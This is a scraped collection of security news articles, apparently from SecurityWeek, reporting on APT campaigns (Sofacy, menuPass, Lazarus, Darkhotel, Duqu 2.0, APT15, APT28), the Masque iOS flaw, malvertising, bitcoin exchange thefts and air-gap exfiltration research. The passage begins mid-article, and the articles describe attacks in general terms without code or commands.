scroll down to it. This Flash object, displayed in the document as a tiny black box, contacts the command and control (C&C) server to download an additional Flash object that contains the actual exploit.  Kaspersky reported last week that it had seen overlaps between attacks launched by Sofacy and campaigns conducted by other state-sponsored cyberspies, including ones linked to China and the United States.

The 23-year-old expert from Ilfracombe, England, became famous and was named a “hero” a few weeks ago after he helped stop the WannaCry ransomware attack by registering a domain that acted as a kill switch for the malware. MalwareTech had not made his real identity known online, but the fame brought by the WannaCry incident led to reporters tracking him down. On Monday, Hutchins, who works for LA-based Kryptos Logic, pleaded not guilty in a Wisconsin federal court to all the charges brought against him. The hacker cannot leave the United States during his trial and he will be tracked via GPS. Interestingly, while he will be allowed to access the Internet in order to continue working, he has been prohibited from accessing the domain used to stop the WannaCry outbreak. The researcher was arrested while preparing to return to the U.K. from Las Vegas, where the Black Hat and Def Con security conferences had taken place. He was later released on a $30,000 bond, an amount raised by his friends and supporters. The expert and an unnamed individual who Hutchins allegedly conspired with have been charged with six counts related to the creation, advertising, sale and use of the Kronos malware. According to authorities, which claim these activities took place in 2014 and 2015, Hutchins’ partner attempted to sell the malware on dark web marketplaces, including the recently shut down AlphaBay, for $2,000 and $3,000. Many believe the charges against the British researcher are the result of a mistake, considering his involvement in malware analysis. Some believe code written by him may have been weaponized by cybercriminals. A legal defense donation page has been set up to raise the funds necessary to ensure that Hutchins gets a fair trial. \"Marcus Hutchins is a brilliant young man and a hero,\" said Marcia Hofmann, the EFF and Zeitgeist Law attorney representing Hutchins at the hearing on Monday. \"He is going to vigorously defend himself against these charges. And when the evidence comes to light we are confident he will be fully vindicated.\" Hutchins is also represented by Brian Klein, a partner at Baker Marquart. " }

The researchers have dubbed it the 'Masque Attack'. In July, the FireEye mobile security team discovered that an iOS app installed using enterprise or ad-hoc provisioning could replace another genuine app installed through the App Store if both applications used the same bundle identifier. The vulnerability exists because iOS doesn't enforce matching certificates for apps with the same bundle identifier, according to the firm. Once the victim is enticed into installing the malicious app, FireEye researchers explained, the illegitimate application will replace the genuine one. The only apps that appear to be unaffected by the issue are pre-installed applications such as Mobile Safari. According to FireEye, the attacker can leverage this issue both wirelessly and through USB.   \"After looking into WireLurker, we found that it started to utilize a limited form of Masque Attacks to attack iOS devices through USB,\" the FireEye researchers blogged. \"Masque Attacks can pose much bigger threats than WireLurker. Masque Attacks can replace authentic apps,such as banking and email apps, using attacker's malware through the Internet. That means the attacker can steal user's banking credentials by replacing an authentic banking app with an malware that has identical UI. Surprisingly, the malware can even access the original app's local data, which wasn't removed when the original app was replaced. These data may contain cached emails, or even login-tokens which the malware can use to log into the user's account directly.\" The vulnerability has been verified by FireEye on iOS 7.1.1, 7.1.2, 8.0, 8.1 and 8.1.1 beta on both jailbroken and non-jailbroken devices. Researchers stated that they notified Apple July 26, and added that they have seen proof the issue is starting to circulate. Apple did not respond immediately to a SecurityWeek request for comment. Among other actions, an attacker could mimic the original app's login interface and steal a victim's credentials. The researchers also found that because data under the original app's directory remained in the malware local directory after the original app was replaced, the malware can steal sensitive data. In addition, the attacker can also use Masque Attacks to bypass the app sandbox and get root privileges by attacking known iOS vulnerabilities. \"We disclosed this vulnerability to Apple in July,\" according to FireEye. \"Because all the existing standard protections or interfaces by Apple cannot prevent such an attack, we are asking Apple to provide more powerful interfaces to professional security vendors to protect enterprise users from these and other advanced attacks.\" The firm recommends users don't install apps from third-party sources other than Apple's official App store or the user's organization. Also, avoid clicking install on a pop-up from a third-party webpage, and be wary of any app that triggers a 'Untrusted App Developer' alert from iOS. \"To check whether there are apps already installed through Masque Attacks, iOS 7 users can check the enterprise provisioning profiles installed on their iOS devices, which indicate the signing identities of possible malware delivered by Masque Attacks, by checking “Settings - > General -> Profiles” for “PROVISIONING PROFILES”,\" according to FireEye. \"iOS 7 users can report suspicious provisioning profiles to their security department. Deleting a provisioning profile will prevent enterprise signed apps which rely on that specific profile from running. However, iOS 8 devices don’t show provisioning profiles already installed on the devices and we suggest taking extra caution when installing apps.\" " }

According to the researchers, the attack leads users to the Angler Exploit kit, which leverages a vulnerability in Adobe Flash Player (CVE-2015-3090) to infect users with the Bunitu Trojan. \"Revive Adserver is an open source advertizing technology formerly known as OpenX Source,\" the researchers noted in a blog post. \"It allows businesses to host and manage their own advertizing services rather than relying on third party services, and it is common for multiple websites to use the same Revive Adserver script. We have seen compromised Revive Adserver scripts used in malvertising in the past, and seemingly this continues to be a target of interest for cybercriminals. The code injected into the compromised Revive Adserver scripts in this campaign have been seen to lead to the very prevalent Angler Exploit Kit.\" The injected code is not always sent when the script is requested, and the Angler kit will only serve the malicious exploit code once per IP address in a 24-hour period. Since April, researchers have compromised Revive Adserver scripts being used by several sites, some of which only seem to contain the injected code for 24 hours, while others have remained compromised for weeks, the researchers found. Once the Bunitu Trojan is dropped on the victim's machine, it turns the system into a zombie computer. The malware drops and loads a DLL within its own process that opens two random ports on the infected machine for a SOCKS5 proxy and a HTTP proxy. It also has back-up infrastructure in case the hard-coded call home server is not available.  \"Ad networks are pervasive and ads are the economic backbone of the internet – hence very juicy targets,\" explained Rajiv Motwani, Raytheon|Websense director of security research. \"Like any other piece of code, ad networks can also be exploited and we have seen a large uptick in malvertising over the last couple of years. Once an ad network is compromised, an attacker could serve malware to any subset of visitors to the sites using that ad network and even use very precise targeting of the victims depending on the functionality made available by the ad network, which is typically good.\" " }

But this same anonymity also makes it attractive for cybercriminals. At Kaspersky Lab, researchers say there has been an uptick in criminal activity on TOR during the past few months.   \"Although the Tor infrastructure and cybercriminal resources are not on the same scale as the conventional Internet, we managed to find approximately 900 hidden services online at the current time,\" blogged Sergey Lozhkin of Kaspersky Lab. \"There are also approximately 5,500 nodes in total and 1,000 exit nodes, but the possibility of creating an anonymous and abuse-free underground forum, market or malware C&C [command and control] server is attracting more and more criminals to the Tor network.\" These underground marketplaces are used to move everything from drugs to weapons to malware. Carding forums are present as well, and stolen personal information is also for sale. Bitcoins play an important role in many of the transactions on these markets, Lozhkin explained. \"Almost everything on the Tor network is bought and sold using bitcoins,\" he blogged. \"Although it’s almost impossible to make a connection between a bitcoin wallet and real person, it is possible to track bitcoin transactions as all of them are transparent and public, to build up a scheme of what’s going on and find out the most valuable transactions made via bitcoin exchange services. That’s why money laundering services exist on Tor. Cybercriminals can create an account, deposit bitcoins and they will be broken up into various quantities, transferred through dozens of different wallets to make any investigation highly complicated.\" There has also been an increase in the amount of malware using TOR to mask their command and control infrastructure. Some recent examples are a 64-bit version of Zeus detected a few months ago and a piece of malware known as ChewBacca linked to attacks on point-of-sale systems. Late last month, researchers at Kaspersky Lab also spotted malware aimed at Google Android using TOR to hide its command and control as well.  \"While cyber-criminals have been using Tor for many years to communicate or to hide their location, only recently we have started to see Tor functionality being included in the actual malware,\" said Stefan Tanase, senior security researcher at Kaspersky Lab. \"Unfortunately there isn’t much that can be done differently in regard to criminal forums hosted on Tor hidden services,\" he added. \"While such forums are operating anonymously in the clear internet as well, the only way law enforcement manages to shut them down is through classic investigation techniques - such as following the trail of the money in most cases.\" " }

The group is known as menuPass, Stone Panda and APT10, and it has been active since at least 2009. The actor initially targeted defense contractors in the United States and elsewhere, and since 2014 it has also attacked organizations in Japan. menuPass is known for using PlugX and PoisonIvy, which have been observed in campaigns launched by several actors. However, a recent menuPass operation, which took place between September and November 2016, involved a new Trojan, dubbed ChChes, that is unique to this group. The recent operation targeted Japanese academics working in various scientific fields, a Japanese pharmaceutical company, and a US-based subsidiary of a Japanese manufacturing firm. The attacks started with spear-phishing emails that came from spoofed addresses, including of the Sasakawa Peace Foundation and the White House. One clue that linked ChChes to other tools used by menuPass was a shared import hash. However, experts also discovered connections in the infrastructure used in the recent and older attacks. ChChes was disguised as a Word document and it was signed using a certificate from Italian spyware maker Hacking Team. The certificate was leaked when the company was hacked in July 2015, but it had been revoked long before the latest menuPass attacks. Researchers believe attackers may have used it in an effort to make attribution more difficult. In addition to collecting information about the infected system, ChChes has modules that help it encrypt communications, execute shell commands, upload and download files, and load and execute DLLs, according to an analysis conducted by Japan’s Computer Emergency Response Team Coordination Center (JPCERT/CC). Palo Alto Networks believes ChChes is only used to download other malware onto infected computers, especially since it does not have a persistence mechanism. “In a successful intrusion, it may be only a first stage tool used by the attackers to orient where they landed in a network, and other malware will be deployed as a second stage layering for persistence and additional access as the attackers move laterally through a network,” researchers said in a blog post.

Experts from the Cyber-Security Research Center at the Ben-Gurion University of the Negev in Israel combined previous research on communications through ultrasonic waves with a technique that can be used to turn a device’s speakers into a microphone in an effort to create a covert data exfiltration channel. Researchers demonstrated several years ago that audio modulation and demodulation can be used to exchange data between computers over the air via the ultrasonic frequency range. The method requires that the devices communicating with each other are equipped with both microphones and speakers. However, it’s possible to turn speakers, headphones or earphones into microphones using only software, which Ben-Gurion University researchers demonstrated back in 2016 in an attack they dubbed SPEAKE(a)R. Experts have now combined the two methods to show that a piece of malware installed on an air-gapped system fitted with speakers, headphones or earphones can transmit bits of data to one or more nearby devices running malware designed to capture the data via an audio output system turned into a microphone. These types of attacks, which they have dubbed MOSQUITO, can be launched in scenarios involving desktop computers that don’t have a microphone, or when the microphone on a laptop or desktop system has been disabled or taped. The data exchange can take place over inaudible sound waves at frequencies of 18kHz or higher, which can be captured by regular headphones or speakers. The data can be modulated through audio frequency-shift keying (AFSK), which uses one frequency to transmit “0” bits and a different frequency to transmit “1” bits.  Tests conducted by researchers showed that a transfer rate ranging between 1200 bits/sec and 1800 bits/sec can be obtained for up to 8 meters (26 feet) for audible frequencies transmitted and captured using loudspeakers. The transfer rate drops to between 300 bits/sec and 600 bits/sec for inaudible frequencies. Experiments conducted using headphones and earphones as recipients showed that they are not much worse than speakers, with transfer rates ranging between 300 bits/sec and 600 bits/sec over distances of 1m (3ft), 5m (16ft) and 8m (26ft). However, performance is significantly degraded when headphones are used both by the sender and the recipient — it only works over a distance of up to 3m (10ft) at a maximum of 250 bits/sec. It’s worth noting that these are upper theoretical transmission rates. In practice, the transfer rate is influenced by environmental noise, the position of the transmitter and receiver, and bit error rates. “Our experiments shows that at a distance of three meters between two speakers, a transmission rate of 166 bit/sec results in a 1% bit error rate, during the exfiltration of a 1Kbit binary file,” researchers explained in their paper. “However, at distances of 4-9 meters, the 1% bit error rate is only achieved at transmission rates of 10 bit/sec. Our waveform analysis shows that the signal quality is degraded at distances greater than four meters mainly due to the environmental noise, which results in a lower SNR.” Researchers at the Ben-Gurion University of the Negev previously demonstrated that stealthy data exfiltration is also possible via magnetic fields, infrared cameras, router LEDs, scanners, HDD activity LEDs, USB devices, the noise emitted by hard drives and fans, and heat emissions.

The threat actor, which has been active since at least 2009, is said to be responsible for several high-profile attacks, including the 2014 attack targeting Sony Pictures. Links have also been found to the recent WannaCry ransomware attacks. The Lazarus group, tracked by the U.S. government as Hidden Cobra and known by security firms for its Operation Blockbuster, Dark Seoul and Operation Troy campaigns, continues to be active. Recent attacks observed by Palo Alto Networks against U.S. defense contractors appear to have been launched either by this group directly or in cooperation with other cyberspies. According to researchers, the hackers have sent out spear phishing emails containing weaponized Microsoft Office documents written in English that use macros to deliver a piece of malware. Specifically, Palo Alto has seen decoy documents describing job openings at some U.S. defense contractors. The text in these documents appears to be an exact copy, including typos, of job descriptions available on the legitimate company’s website. There are several links between these attacks and other recent campaigns, including very similar macros, decoy document details, command and control (C&C) servers, and payloads. “This reuse of macro source code, XOR keys used within the macro to decode implant payloads, and the functional overlap in the payloads the macros write to disk demonstrates the continued use of this tool set by this threat group. The use of an automated tool to build the weaponized documents would explain the common but not consistent reuse of metadata, payloads, and XOR keys within the documents,” researchers explained. Palo Alto Networks pointed out that the tools and tactics used by the group have changed only little compared to previous campaigns, despite the numerous reports describing its activities. This has led experts to believe that the Lazarus group will continue to launch targeted attacks. While the gang has been tied to several espionage and destruction campaigns, many of its recent attacks appear to have focused on financial institutions, including Bangladesh’s central bank and banks in Poland.

Dubbed the \"Darkhotel APT,\" the threat actors use three different malware distribution methods, including malicious Wi-Fi networks, booby-trapped P2P torrents, and highly customized spear phishing, Kaspersky Lab noted in research paper.  The Darkhotel team is \"self-contradictory\" in its sophistication, as the attacks use highly customized malware but the supporting infrastructure is poorly run, Kurt Baumgartner, a senior threat researcher with the company's Global Research and Analysis Team, told SecurityWeek.  Even though the distribution mechanisms are so different, they all tie back to the same attack team, which is most likely Korean-speaking, Baumgartner said.  Victims spanned industry sectors and in multiple countries around the globe, including members of the defense industrial base (DIB), military-related organizations, energy policy makers, governments, non-governemental organizations (NGOs), large electronics and peripherals manufacturers, pharmaceutical companies, and medical providers, saidI Kaspersky Lab. The majority of Darkhotel-infected machines appear to be located in Japan, Taiwan, China, Russia and Korea, but there are plenty of victims in other countries such as Germany, the United States, Indonesia, India, and Ireland, according to the report.  Of the three attack methods, the malicious WiFi attacks are the most interesting, Baumgartner said, calling the technique an \"abuse of hotel network resources.\" In this scenario, a business traveler is compromised when connecting to the Wi-Fi network of the hotel he or she is staying at. After the guest enters the last name and room number to establish a connection, the attack tricks the victim into downloading the Darkhotel backdoor masquerading as a software update for popular software tools, such as Adobe Flash, Google Toolbar, or Windows Messenger. Baumgartner said the attackers were not using rogue access points to compromise the victims.  The attack team uses the backdoor to assess the victim's job role to push additional pieces of information-stealing malware on to the computer. There were attempts to steal login credentials for Yahoo Japan, Yandex, and the now-defunct encrypted email service Lavabit, for example. Other pieces had the capability to spread through the internal network via shared drives. The espionage campaign targets business travelers from different countries staying in \"hotels in the APAC region,\" he said. Kaspersky Lab researchers found attack networks in multiple hotels across different hotel chains.  In some cases, the hotel ran its own IT operations and managed its own Wi-Fi network. In other cases, the hotels outsourced the entire operation to a third-party provider, and the providers were different from hotel to hotel. It is not clear at this point whether the hotels themselves are victims or somehow part of the attack, and there are still a lot of questions about this attack technique, Baumgartner said.   In February, Kaspersky Lab detected a spear phishing attack against users in China targeting a zero-day exploit for Adobe Reader. The email typically included topics such as nuclear energy and weaponry capabilities with either a malicious attachment or a link to a site designed to exploit vulnerable versions of Internet Explorer, according to the report. This was a good example of how attackers tend to be opportunistic and use whatever is available before working up to a more sophisticated attack, he said.  These Darkhotel attacks \"pinpointed\" the victims, Kaspersky Lab said.  The final attack technique used by Darkhotel is a little surprising as it relied on P2P file-sharing sites to distribute Japanese anime movies. Unlike other torrent-based attacks, the movies themselves were not injected with malware. Instead, victims were told to download a decrypting tool along with the encrypted torrent file. The exectuable was injected with malware, so decrypting the torrent file activated the malware and infected the victim machine. This package with encrypted torrent and decrypting tool executable with malware embedded was downloaded over 30,000 times in less than six months.  Unlike the other two attack methods, which targeted a specific group of victims, the P2P method generated a more diverse victim pool. Even so, the malware sorted through the victims, as it knew not to execute on researcher-machines, or on IP addresses which fell within the IP range owned by Trend Micro, Baumgartner said.  \"The business executives are still susceptible as they appear to be attracted to these torrents and the delivery vector,\" Kaspersky Lab said in its report.  Despite the disparate attack methods, the decryptor tool and the backdoor malware used by Darkhotel were all signed with the same digital certificate, used the same command-and-control infrastructure, and shared code components, Baumgartner said. The certificates were legitimate, and not one that had been stolen from someone else, according to the report.  The Darkhotel APT threat actor has been in operation for nearly a decade—some samples of their code date back to 2007, according to Baumgartner—and is still active. The hotel attacks date back to four or five years, but the spear phishing attack was first observed this year, he said.  Considering the sophistication of the attack techniques, it was surprising the infrastructure supporting Darkhotel was fairly rudimentary, Baumgartner said. It was almost as if there were different teams running different aspects of the campaign, such as the operations team maintaining the servers and the developers working on the malware.  Kaspersky researchers had a few basic recommendations on staying safe, such as using VPN tunnels when accessing public or semi-public WiFi networks at hotels and similar places. Users should maintain and regularly update all system software, and when traveling, consider all update prompts as suspicious. Users should learn how to recognize spearphishing attacks and to treat executables downloaded from P2P networks as dangerous. The full report from Kaspersky Lab is available online in PDF format. " }

First it was the collapse of Mt. Gox; now two more bitcoin exchanges say they have been hit by hackers. According to officials at Poloniex and Flexcoin, attackers recently hit the exchanges and made off with a substantial amount of Bitcoins. As a result of the theft, Flexcoin announced it was shutting down, while Poloniex vowed to recover from the incident and take steps to improve security. At Flexcoin, officials said that on March 2, hackers stole 896 bitcoins valued at more than $600,000 from its \"hot wallet.\" To pull of the heist, the attacker created a Flexcoin account. After depositing some bitcoins into it, the attacker exploited a vulnerability in the code that allows transfers between users. \"By sending thousands of simultaneous requests, the attacker was able to 'move' coins from one user account to another until the sending account was overdrawn, before balances were updated,\" according to the company. \"This was then repeated through multiple accounts, snowballing the amount, until the attacker withdrew the coins.\" \"[The hack of] Flexcoin reminds me of vulnerabilities I used to see in online banking applications 10 years ago,\" Amichai Shulman, Imperva's CTO, said in a statement. \"I think that the story here is not the individual incident or the individual vulnerability but the fact that this has been a repetitive pattern over the past few months.\" \"I think that what Bitcoin users are learning now, the hard way, is that there are some benefits to the existing 'centralized', regulated financial infrastructure (like supervision and insurance for example),\" he said. Over at Poloniex, the company said an attack March 4 cost users 12.3 percent of their bitcoins. In this case, the attacker took advantage of a vulnerability in the code that takes withdrawals. \"The hacker discovered that if you place several withdrawals all in practically the same instant, they will get processed at more or less the same time,\" the company explained in a post on a Bitcoin forum. \"This will result in a negative balance, but valid insertions into the database, which then get picked up by the withdrawal daemon.\" \"The major problem here is that the auditing and security features were not explicitly looking for negative balances,\" according to the company. \"They add deposits and withdrawals and check that accounts are in balance. If you have 2 BTC, withdraw 10 BTC, and are left with -8 BTC, the software would see that you deposited 2, withdrew 10, and have exactly what you should: -8. Another design flaw is that withdrawals should be queued at every step of the way. This could not have happened if withdrawals requests were processed sequentially instead of simultaneously.\" Still, the company noted that it discovered the activity because an existing security feature noticed unusual withdrawal activity and stopped it. Poloniex said it is committed to repaying the stolen money, and added that the withdrawal daemon now checks for negative balances before processing withdrawals and will freeze any account with a negative balance.  \"The next thing that will be done--before markets are unfrozen--is a daemon will be created that continually monitors for negative balances and freezes any account with a negative balance,\" according to the company. \"After that, markets can be unfrozen and withdrawals resumed. Immediately following that, a daemon that will run automated audits on every account will be created, which will alert me of any strange activity and freeze any account with an overage of a balance.\" John Miller, security research manager at Trustwave, told SecurityWeek that attacks against exchanges and other commercial users of cryptocoins such as Bitcoin are expected to rise.  \"Since most of the exchanges and other third party services underlying the crypto currency economy do not function as financial institutions, there is little recourse for users of defunct services,\" he said. \"Any organization that deals with crypto currency needs to implement security controls on par with other payment methods and take care to address specific concerns brought about by their use of alternative currency. Penetration testing and application assessments are standard testing procedures for companies dealing with payment card information. Companies accepting Bitcoin should be under no less scrutiny.\" " }

So it is that the minds behind the Duqu attack platform have burst back on the scene after going dark in 2012. Linked to multiple zero-days that have now been patched, 'Duqu 2.0' is more stealthy and has been tied to attacks against targets involved in the negotiations about Iran's nuclear deal as well as the IT security industry itself. Kaspersky Lab said that in the early spring they detected an intrusion of its own internal systems while testing a prototype of technology designed to detect advanced persistent threats. The attack included some unique features that did not leave any traces, such as disk files or altered system settings. After discovering the attack, Kaspersky Lab performed an initial audit that included source code verification astund checking of its corporate infrastructure. The audit - which is still ongoing and is expected to be completed in a few weeks, revealed that the main purpose of the attack was to spy on the company, its research and its processes. Thus far, no interference with processes or systems has been detected, and the company said it is confident its products and customers are safe. According to Kaspersky Lab, the level of sophistication of the attack surpasses even the 'Equation Group', which is suspected by some to be linked to the NSA. The malware only exists in the system's memory, making it difficult for anti-malware solutions to detect, explained Kurt Baumgartner, principal security researcher at Kaspersky Lab. \"It also doesn’t directly connect to a command-and-control server to receive instructions,\" he said. \"Instead, the attackers infect network gateways and firewalls by installing malicious drivers that proxy all traffic from internal network to the attackers’ [command and control servers]. Combined, this made discovery very difficult.\" \"The Duqu people were confident enough to create and run an entire cyber-espionage operation just in the system’s memory, and that they can survive within an entire network of compromised computers without relying on any persistence mechanism at all,\" he said. Researchers discovered several similarities in the code of Duqu 2.0 and the original version of the platform publicized in 2011, including in a set of functions that provide logging facilities. \"During our analysis in 2011, we noticed that the logs collected from some of the proxies indicated the attackers appear to work less on Fridays and didn’t appear to work at all on Saturdays, with their regular work week starting on Sunday,\" said Baumgartner. \"They also compiled binaries on January 1st, indicating it was probably a normal workday for them. The compilation timestamps in the binaries seemed to suggest a time zone of GMT+2 or GMT+3. Finally, their attacks would normally occur on Wednesdays, which was the reason we originally referred to them as the “Wednesday Gang”.\" The majority of the same time indicators were found in the Duqu 2.0 attack as well, he said. Researchers at Kaspersky Lab believe Duqu 2.0 may have leveraged three zero-days: CVE-2015-2360, CVE-2014-4148 and CVE-2014-6324. According to Kaspersky Lab, the initial attack against the firm began with the targeting of an employee in one of its smaller offices in the Asia-Pacific region. While the original infection vector is not currently known, it is believed spear-phishing was involved because one of the victims had their mailbox and web browser history wiped to hide traces of the attack. Other victims of the attackers have been found in Western countries as well as nations in the Middle East and Asia.  Most of the new 2014 and 2015 infections are linked to P5+1 events and venues associated with negotiations with Iran about a nuclear deal, the firm reported. The attackers appear to have launched attacks at venues where the talks took place, as well as a similar attack related to the 70th anniversary event of the libration of the Auschwitz-Birkenau death camp. According to Symantec, other victims include telecoms operators in Europe and North Africa as well as a South East Asian electronic equipment manufacturer. There were also infections on computers in the U.S., U.K., Sweden, India and Hong Kong. \"Spying on cybersecurity companies is a very dangerous tendency,\" Eugene Kaspersky, CEO of Kaspersky Lab, said in a statement. \"Security software is the last frontier of protection for businesses and customers in the modern world, where hardware and network equipment can be compromised. Moreover, sooner or later technologies implemented in similar targeted attacks will be examined and utilized by terrorists and professional cybercriminals. And that is an extremely serious and possible scenario.\"  According to Mr. Kaspersky, there may be several reasons why an attacker might want to access the company's technical data. \"Maybe the idea was to steal our technologies, source code, know-how and ideas to support the attackers’ own software development,\" he wrote in a blog post published on Forbes.Com. \"That would help cut a corner or two, but makes little sense in the long run. Modern software is always a work-in-progress – it’s always in development – so you need to keep running very fast just to keep up, otherwise the copied software becomes obsolete fast.\" According to Kaspersky, another reason could be that the spies were interested in the inner workings of the company. \"We obviously have our share of technological secrets as we’re a competitive business, but I can’t think of anything really top secret,\" he noted. Kaspersky also explained that the attackers were probably interested in the company's ongoing investigations and research methods and to \"know what’s cooking in the Kaspersky Lab kitchen\" so as to quickly develop mitigation techniques to stay under their radar. \"Anyway, no matter the reasons behind this attack, the bad guys have lost a very expensive and sophisticated framework they’d been developing and nurturing for years,\" the CEO said. While the company did not attribute the attack to a particular Nation state, some reports suggest a possible link to Israel. When asked about such a connection during a press conference on Wednesday, Mr. Kaspersky said he found the possible connection \"interesting,\" but held back from directly calling out Israel for attacking his company. Kaspersky provided Indicators of Compromise (IOCs) including MD5s and IPs from the command and control servers, which can be found here, along with Yara rules which can be found here. *Additional reporting by Mike Lennon " }

The campaign, dubbed Operation BugDrop, has been underway since at least June 2016. It involves malware delivered via spear phishing emails and malicious macro-enabled Office documents. The BugDrop malware is capable of collecting system information, passwords and other browser data, and audio from the microphone. It can also steal files from local, shared and USB drives, including documents, spreadsheets, presentations, archives, databases and text files. Each of these capabilities is provided by a different module, but researchers determined that not all modules are deployed on every infected device. Based on its analysis, CyberX believes BugDrop is a reconnaissance operation and it could represent the first phase of a campaign with broader objectives. The main module, which downloads the other components, is designed to upload the stolen data to a specified Dropbox account. Experts believe the malware uses Dropbox for exfiltration because the file sharing service is often not blocked or monitored by firewalls. The malware also includes various anti-reverse engineering mechanisms, including checking for debuggers, virtual environments, WireShark and Process Explorer. The malware also attempts to evade detection by using encrypted DLLs and a technique called reflective DLL injection, which had also been leveraged by BlackEnergy and Duqu. CyberX said a majority of the targets of Operation BugDrop are located or have an interest in Ukraine, but the attackers have also targeted entities in Russia, Saudi Arabia and Austria. Many of the Ukrainian organizations are located in the self-proclaimed states of Donetsk and Luhansk. The list of victims includes an international organization that monitors human rights, counter-terrorism, and cyberattacks on critical infrastructure in Ukraine; a firm specializing in remote monitoring systems for oil and gas pipeline infrastructure; an energy company that designs gas pipelines, electrical substations, and water supply plants; a Ukrainian newspaper; and a scientific research institute. “The operation requires a massive back-end infrastructure to store, decrypt and analyze several GB per day of unstructured data that is being captured from its targets. A large team of human analysts is also required to manually sort through captured data and process it manually and/or with Big Data-like analytics,” CyberX said in its report. Based on its sophistication, CyberX believes the campaign is likely run by a state-sponsored actor, but the company has not named any country. The security firm noted that there are many similarities to Operation Groundbait, a campaign detailed by ESET in May 2016. Operation Groundbait also targeted organizations in Ukraine and it also leveraged modular malware to steal data. ESET determined that it could be the work of a politically-motivated group from within Ukraine, which led the company to classify it as cyber surveillance. However, CyberX believes Operation BugDrop is more sophisticated. For instance, Dropbox was not used for exfiltration in Operation Groundbait, and BugDrop used legitimate free web hosting to store its malware, as opposed to Groundbait attackers which paid for their domains and IP addresses. Furthermore, the malware used in BugDrop was compiled one month after ESET published its report. Experts believe the two campaigns are either not related or the attackers decided to change their tactics, techniques and procedures after their activities were exposed. " }

Details about the attack were presented last week at Kaspersky’s Security Analyst Summit (SAS) in Cancun by Ahmed Zaki, senior malware researcher at NCC Group. The attack has been attributed to a threat actor known as APT15, Ke3chang, Mirage, Vixen Panda and Playful Dragon. NCC Group started analyzing the group’s recent activities after it targeted one of its customers, a global company that provides a wide range of services to the United Kingdom government. Researchers believe the attackers had been targeting various U.K. government departments and military technology through its customer. NCC has not made any statements regarding attribution, but Zaki did mention during his presentation at SAS that APT15 was particularly active during hours that correspond to working hours in East Asia. APT15 has been active since at least 2010 and it has targeted organizations all around the world using its own malware and Word, Adobe Reader and Java exploits. The group has improved its tools and techniques over the years, and NCC recently spotted two new backdoors it created. One of the backdoors has been dubbed RoyalCLI and is considered a successor of BS2005, a piece of malware that is often used by the group. RoyalCLI leverages similar encryption and encoding routines, and they both communicate with command and control (C&C) servers via Internet Explorer using the IWebBrowser2 interface. The malware uses the Windows command prompt (cmd.exe) to execute a majority of its commands. It’s designed to copy the cmd.exe file and modify it, which allows it to bypass policies that might prevent the command prompt from running on the targeted device.   The second backdoor, named RoyalDNS, uses DNS, specifically TXT records, to communicate with the C&C server. This piece of malware receives commands, executes them, and returns output through DNS. In the case of the attack analyzed by NCC, the hackers compromised more than 30 hosts, with forensic artifacts showing that the initial intrusion may have occurred as early as May 2016. NCC was asked by the client to stop its investigation in June 2017, but resumed it in August after the threat actor managed to regain access to the victim’s network. Experts determined that the hackers had stolen a VPN certificate from a compromised host and used it to regain access via the corporate VPN.  The commands sent by the attackers to the RoyalCLI and BS2005 malware were cached to the disk of compromised devices, allowing researchers to recover over 200 commands. Since one of the commands contained a typo, investigators determined that they were likely sent by a human operative rather than an automated process. In addition to BS2005, RoyalCLI and RoyalDNS, APT15 used custom-built keyloggers, and Microsoft SharePoint and Exchange enumeration and data dumping tools. The group’s arsenal also includes widely available tools such as Mimikatz, CSVDE, NetEnum, and RemoteExec. Moreover, the attackers relied on various Windows commands to conduct reconnaissance, including tasklist, ping, netstat, net, systeminfo, ipconfig and bcp. For lateral movement they leveraged the net command and manually copied files to and from compromised hosts. “Through our investigation we were able to identify and monitor the attack process from start to finish, offering us unique insight into the behaviour of this group,” Zaki said. “It’s clear to see that this is a highly sophisticated threat actor that has no problem writing tools which are specific to its victims.” " }
{ "_id" : { "$oid" : "5b27c4246cefc41c844ab2ae" }, "Category" : "Malware", "Title" : "Russian Cyberspies Target Hotels in Europe", "Address" : "https://www.securityweek.com/russian-cyberspies-target-hotels-europe", "Date" : "August 11, 2017", "Article" : "A notorious Russia-linked hacker group specializing in cyber espionage is believed to be behind an ongoing campaign targeting hotels in several European countries. FireEye has linked the attacks with moderate confidence to APT28, a threat actor also known as Pawn Storm, Fancy Bear, Sofacy, Sednit and Strontium. The group is believed to have launched numerous high-profile attacks, including a campaign targeting last year’s presidential election in the United States. While the recent attacks have targeted the networks of hotels, the security firm says there is some indication that the hackers may actually be looking to access the devices of government and business travelers via the guest Wi-Fi provided by these hotels. FireEye has seen attacks targeting several companies in the hospitality sector, including hotels in seven European countries and one Middle Eastern country. The attacks start with a spear phishing email sent to a hotel employee. The emails carry a document named “Hotel_Reservation_Form.doc,” which uses macros to decode a dropper that deploys GameFish, a piece of malware known to be used by APT28. This backdoor was used recently in a campaign launched by the threat group against Montenegro just as the country had been preparing to join NATO. Once they gained access to the targeted hotel’s network, the hackers used the NSA-linked EternalBlue SMB exploit, which was also involved in the recent WannaCry and NotPetya outbreaks, to move laterally within the network. Researchers said this was the first time the group had used this exploit. The cyberspies also used Responder, an open source penetration testing tool developed by Laurent Gaffie of SpiderLabs. They leveraged Responder for NetBIOS Name Service (NBT-NS) poisoning. “This technique listens for NBT-NS (UDP/137) broadcasts from victim computers attempting to connect to network resources. Once received, Responder masquerades as the sought-out resource and causes the victim computer to send the username and hashed password to the attacker-controlled machine. APT28 used this technique to steal usernames and hashed passwords that allowed escalation of privileges in the victim network,” FireEye researchers explained. In one incident that occurred in 2016, a user connected to a hotel’s Wi-Fi and 12 hours later their device was accessed by APT28 using stolen credentials. The attackers started moving through the victim’s network and accessed their Outlook Web Access (OWA) account. While these attacks can be carried out remotely, in this case the attacker appeared to be on the same network and physically close to the victim. Kaspersky reported recently that APT28 has been using two zero-day vulnerabilities in targeted attacks, and it has started experimenting with new macro techniques. These are not the only attacks apparently aimed at travelers. Other campaigns include DarkHotel, which some have linked to South Korea, Duqu 2.0, targeting the networks of European hotels hosting participants in Iranian nuclear negotiations, and according to some reports, high-profile people visiting Russia and China may have their devices accessed. “Cyber espionage activity against the hospitality industry is typically focused on collecting information on or from hotel guests of interest rather than on the hotel industry itself, though actors may also collect information on the hotel as a means of facilitating operations,” FireEye said. “Business and government personnel who are traveling, especially in a foreign country, must often rely on less secure systems to conduct business than at their home office, or may be unfamiliar with the additional threats posed while abroad.” " }

